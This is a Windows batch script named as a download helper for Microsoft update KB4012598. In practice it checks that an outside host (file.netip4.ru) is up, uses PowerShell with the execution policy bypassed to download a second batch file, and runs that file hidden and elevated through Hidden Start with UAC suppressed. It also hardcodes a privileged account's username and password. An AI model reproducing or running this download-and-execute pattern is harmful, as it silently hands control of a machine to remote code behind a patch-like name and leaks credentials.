@echo on
rem *******************************************************
rem msft-KB4012598.script.download.bat
rem This file will Download an Executable Script
rem *******************************************************
echo off

rem Set Variables
rem
@echo off

rem Initialization of Variables

SetLocal EnableExtensions EnableDelayedExpansion

rem Metadata

set PRODUCT_NAME=KB4012598
set REDACT=
set FIRM=Microsoft
set PRODUCT_FOLDER_REMOTE=%FIRM%/%PRODUCT_NAME%/WSH/

rem Set a Directory
rem

set CURDIR=%CD%

rem set TPDL variable
rem
if exist "C:\pub1\Distrib\Zlovred" set TPDL=C:\pub1\Distrib\Zlovred&& goto TPDL_End
set TPDL=%TEMP%
:TPDL_End

set UTIL=C:\UTIL
set pathCMD=%SystemRoot%\system32
set CURLEXE=%UTIL%\CURL.exe
set HSTARTEXE="C:\Program Files\Hidden Start\hstart.exe"
set HSTARTEXE=%HSTARTEXE:"=%
set PRIVUSER=MSSQLSR
set PRIVPASS=Admin01234

set FINDEXE=%pathCMD%\find.exe
set NETEXE=%pathCMD%\net.exe
set PINGEXE=%pathCMD%\ping.exe

rem Set a Variables
rem
set REGEXE=%SystemRoot%\System32\reg.exe

rem Set Host
rem
set aPrefix=http
set aDomain=file.netip4.ru
set aPort=80
set aRemoteDir=/PROGS/%PRODUCT_FOLDER_REMOTE%

set host=%aPrefix%://%aDomain%:%aPort%%aRemoteDir%

rem Set a File
rem
set aFile=msft-KB4012598.run.download.bat

rem Check Integrity...
if not exist %REGEXE% echo %REGEXE% is not Found && exit /b 1
if not exist %COMSPEC% echo %COMSPEC% is not Found && exit /b 1

if not exist %FINDEXE% echo %FINDEXE% is not found && exit /b 1
if not exist %PINGEXE% echo %PINGEXE% is not found && exit /b 1
if not exist %NETEXE% echo %NETEXE% is not found && exit /b 1
if not exist %CURLEXE% echo %CURLEXE% is not found && exit /b 1
if not exist "%HSTARTEXE%" echo "%HSTARTEXE%" is not found && exit /b 1

%NETEXE% USER | %FINDEXE% /I "%PRIVUSER%" > nul
if %errorlevel% neq 0 echo User %PRIVUSER% is not found && exit /b 1
%PINGEXE% -n 1 -4 %aDomain% | %FINDEXE% /I "TTL" > nul
if %errorlevel% neq 0 echo Domain %aDomain% does not work && exit /b 1
%CURLEXE% -o nul -s -w "%%{http_code}\n" %host%%aFile% | %FINDEXE% /I "200" >nul 2>nul
if %errorlevel% neq 0 echo Recource %aFile% has no Error code 200 && exit /b 1

rem Set DownloadShellFolder Variable...
rem
set "Reg32=%SystemRoot%\System32\reg.exe"
if not "%ProgramFiles(x86)%" == "" set "Reg32=%SystemRoot%\SysWOW64\reg.exe"

set "DownloadShellFolder="
for /F "skip=1 tokens=1,2*" %%T in ('%Reg32% query "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders" /v "{374DE290-123F-4565-9164-39C4925E467B}" 2^>nul') do (
    if /I "%%T" == "{374DE290-123F-4565-9164-39C4925E467B}" (
        set "DownloadShellFolder=%%V"
        goto GetDownloadDirectory
    )
)

:GetDownloadDirectory
set "DownloadDirectory="
for /F "skip=1 tokens=1,2,3*" %%S in ('%Reg32% query "HKCU\Software\Microsoft\Internet Explorer" /v "Download Directory" 2^>nul') do (
    if /I "%%S" == "Download" (
        if /I "%%T" == "Directory" (
            set "DownloadDirectory=%%V"
            goto GetSaveDirectory
        )
    )
)

:GetSaveDirectory
set "SaveDirectory="
for /F "skip=1 tokens=1,2,3*" %%S in ('%Reg32% query "HKCU\Software\Microsoft\Internet Explorer\Main" /v "Save Directory" 2^>nul') do (
    if /I "%%S" == "Save" (
        if /I "%%T" == "Directory" (
            set "SaveDirectory=%%V"
            goto EndDownloadResults
        )
    )
)

:EndDownloadResults

rem Get a Downloads Directory
rem
rem if not defined DownloadShellFolder echo DownloadShellFolder is not Defined  && exit /b 1
rem if not exist %DownloadShellFolder% echo %DownloadShellFolder% is not Found && exit /b 1

rem Set My Documents Variable...
rem
for /f "tokens=2,*" %%i in ('%REGEXE% query "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders" /v Personal  ^|findstr /i "REG_"') do set MyDocuments=%%j

rem if not defined MyDocuments (echo Variable My Documents Folder not Defined && exit /b 1)
rem if not exist %MyDocuments% echo %MyDocuments% is not Found && exit /b 1

rem Check UserProfile Variable...
rem
if not defined UserProfile (echo Variable UserProfile Folder not Defined && exit /b 1)
if not exist %UserProfile% echo %UserProfile% is not Found && exit /b 1


rem Set Working Directory
rem Check if User Download Directory Defined and Present
rem
if not defined DownloadShellFolder echo Variable DownloadShellFolder is not defined && goto Lab_Profile
if not exist %DownloadShellFolder% echo %DownloadShellFolder% is not Found && goto Lab_Profile
rem Set Working Directory as User Download Directory
set WorkingDir=%DownloadShellFolder%
goto Lab_EndWorkingdir

:Lab_Profile
rem Set Working Directory as User Profile Directory
set WorkingDir=%UserProfile%
goto Lab_EndWorkingdir

:Lab_EndWorkingdir
rem Set a Directory
rem set WorkingDir=%USERPROFILE%\Downloads

rem Run payload
powershell.exe -NoProfile -WindowStyle Normal -ExecutionPolicy Bypass -Command "((new-object System.Net.WebClient).DownloadFile('%host%%aFile%', '%WorkingDir%\%aFile%'))"

"%HSTARTEXE%" /NOCONSOLE /RUNAS /NOUAC /SHELL "%WorkingDir%\%aFile%"
